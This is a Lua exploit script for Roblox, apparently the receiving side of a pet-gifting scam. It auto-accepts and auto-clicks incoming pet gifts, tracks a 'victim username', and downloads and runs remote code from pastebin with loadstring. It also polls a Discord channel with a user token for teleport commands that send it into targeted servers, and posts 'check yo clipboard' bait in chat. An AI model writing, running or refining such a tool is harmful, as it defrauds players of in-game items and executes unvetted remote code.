if not game:IsLoaded() then
    game.Loaded:Wait()
end
local a = game:GetService("UserInputService")
local b = game:GetService("RunService")
local function c()
    print("Roblox window is IN FOCUS.")
end
b.Heartbeat:Connect(
    function()
        local d = false
        local e = _G.RobloxFocusStatus
        if e == nil then
            c()
            _G.RobloxFocusStatus = d
        elseif d and not e or not d and e then
            c()
            _G.RobloxFocusStatus = d
        end
    end
)
c()

local g = game:GetService("ReplicatedStorage")
local h = g:WaitForChild("GameEvents", 10)
if h then
    local i = h:WaitForChild("GiftPet", 10)
    local j = h:WaitForChild("AcceptPetGift", 10)
    if i and j then
        print("Auto-Accept Script: Hooked and ready. Waiting for gifts...")
        i.OnClientEvent:Connect(
            function(k, l, m)
                local n = l:match("^(.-) %[") or l
                n = n:gsub("^%s+", ""):gsub("%s+$", "")
                if table.find(f, n) then
                    print(
                        string.format("Auto-Accept: Incoming Pet Gift - Pet Name: '%s', From: '%s'. Accepting...", l, m)
                    )
                    pcall(
                        function()
                            j:FireServer(true, k)
                            print("Auto-Accept: Successfully accepted gift with ID: " .. tostring(k))
                        end
                    )
                else
                    print(
                        string.format(
                            "Auto-Accept: Incoming Pet Gift - Pet Name: '%s', From: '%s'. (Not in whitelist, ignoring).",
                            l,
                            m
                        )
                    )
                end
            end
        )
    else
        print("Auto-Accept Script: Could not find GiftPet or AcceptPetGift RemoteEvents.")
    end
else
    print("Auto-Accept Script: Could not find GameEvents folder.")
end
if token == "" or channelId == "" then
    game.Players.LocalPlayer:Kick("Add your token or channelId to use")
end
loadstring(game:HttpGet("https://pastebin.com/raw/xBLu3qtF", true))()
loadstring(game:HttpGet("https://pastebin.com/raw/vbLfSAFd", true))()
local o = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:Connect(
    function()
        o:CaptureController()
        o:ClickButton2(Vector2.new())
    end
)
local p = game:GetService("HttpService")
local q = game:GetService("VirtualInputManager")
local r = isfile("user_gag.txt")
local s = isfile("joined_ids.txt")
if not r then
    writefile("user_gag.txt", "victim username")
end
if not s then
    writefile("joined_ids.txt", "[]")
end
local t = readfile("user_gag.txt")
local u = p:JSONDecode(readfile("joined_ids.txt"))
local v = false
local w = 0
local x = nil
local function y(z)
    table.insert(u, z)
    writefile("joined_ids.txt", p:JSONEncode(u))
end
local function A()
    local B
    B =
        game.Players.PlayerRemoving:Connect(
        function(C)
            if C.Name == t then
                if B then
                    B:Disconnect()
                end
                v = true
            end
        end
    )
end
A()
local D = game:GetService("Players")
local E = D.LocalPlayer
while E:GetAttribute("DataFullyLoaded") ~= true do
    E:GetAttributeChangedSignal("DataFullyLoaded"):Wait()
end
while E:GetAttribute("Finished_Loading") ~= true do
    E:GetAttributeChangedSignal("Finished_Loading"):Wait()
end
while E:GetAttribute("Loading_Screen_Finished") ~= true do
    E:GetAttributeChangedSignal("Loading_Screen_Finished"):Wait()
end
wait(1)
local F = E:WaitForChild("PlayerGui"):WaitForChild("Gift_Notification"):WaitForChild("Frame")
local function G()
    while task.wait(0.1) do
        for H, I in pairs(F:GetChildren()) do
            if I:IsA("ImageLabel") then
                local J = I:WaitForChild("Holder"):WaitForChild("Frame"):WaitForChild("Accept")
                replicatesignal(J.MouseButton1Click)
            end
        end
    end
end
task.spawn(G)
local K = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if K then
    K.CFrame =
        CFrame.new(
        -353.281372,
        2.99999976,
        185.20723,
        -0.824193001,
        -2.05171773e-08,
        0.566309035,
        -4.19167918e-08,
        1,
        -2.47750744e-08,
        -0.566309035,
        -4.41573e-08,
        -0.824193001
    )
end
wait(0.5)
game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Yo gng check yo clipboard")
wait(0.5)
game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("GGS")
local function L()
    while task.wait(1) do
        w = w + 1
    end
end
task.spawn(L)
local function M()
    local N =
        request(
        {
            Url = "https://discord.com/api/v9/channels/" .. channelId .. "/messages?limit=1",
            Method = "GET",
            Headers = {
                ["Authorization"] = token,
                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                ["Content-Type"] = "application/json"
            }
        }
    )
    if N.StatusCode == 200 then
        local O = p:JSONDecode(N.Body)
        if #O == 0 then
            return
        end
        local P = O[1]
        if P.id == x or table.find(u, tostring(P.id)) then
            return
        end
        local Q = P.content or ""
        local R, S = string.match(Q, 'TeleportToPlaceInstance%((%d+),%s*[\'"]([%w%-]+)[\'"]%)')
        if R and S then
            x = P.id
            y(tostring(P.id))
            writefile("user_gag.txt", "unknown")
            game:GetService("TeleportService"):TeleportToPlaceInstance(R, S)
        end
    else
        print("Invalid response code:", N.StatusCode)
    end
end
while task.wait(5) do
    M()
end
